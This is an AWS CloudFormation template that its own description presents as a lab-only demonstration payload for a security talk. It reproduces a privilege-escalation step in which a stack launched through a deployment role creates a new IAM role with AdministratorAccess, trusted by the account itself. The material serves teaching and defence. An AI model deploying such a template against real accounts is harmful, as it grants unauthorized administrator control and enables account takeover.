AWSTemplateFormatVersion: "2010-09-09"
Description: >
  Demo-only escalation payload for the "Scoped or Spoofed" talk. Deployed
  via DeployRole, this stack creates a new role trusted by the AWS account
  itself and attaches AdministratorAccess to it — mirroring the third step
  of the UNC6426 attack chain (CloudFormation as a privilege escalation
  primitive). Deploy this ONLY in an isolated lab account.

Parameters:
  NamePrefix:
    Type: String
    Default: scoped-or-spoofed

Resources:
  EscalatedAdminRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: !Sub "${NamePrefix}-EscalatedAdminRole"
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              AWS: !Sub "arn:aws:iam::${AWS::AccountId}:root"
            Action: "sts:AssumeRole"
      ManagedPolicyArns:
        - "arn:aws:iam::aws:policy/AdministratorAccess"

Outputs:
  EscalatedAdminRoleArn:
    Description: ARN of the role created by this stack
    Value: !GetAtt EscalatedAdminRole.Arn
